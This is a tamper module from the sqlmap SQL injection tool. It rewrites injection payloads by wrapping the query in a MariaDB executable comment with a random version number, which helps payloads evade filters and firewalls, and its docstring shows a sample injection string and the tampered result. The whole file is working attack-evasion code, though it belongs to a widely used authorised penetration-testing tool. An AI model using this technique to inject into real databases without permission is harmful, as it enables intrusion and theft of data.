#!/usr/bin/env python

"""
Copyright (c) 2006-2015 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.common import randomInt
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHER

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Embraces complete query in executable comment

    Requirement:
        * Maria DB

    Tested against:
        * Maria DB 5.5.5

    Notes:
        * Useful for exploiting Maria DB perhaps?

    >>> import random
    >>> random.seed(0)
    >>> tamper('1 AND 2>1--')
    '1 /*M!30874AND 2>1*/--'
    """

    retVal = payload

    if payload:
        postfix = ''
        for comment in ('#', '--', '/*'):
            if comment in payload:
                postfix = payload[payload.find(comment):]
                payload = payload[:payload.find(comment)]
                break
        if ' ' in payload:
            retVal = "%s /*M!30%s%s*/%s" % (payload[:payload.find(' ')], randomInt(3), payload[payload.find(' ') + 1:], postfix)

    return retVal
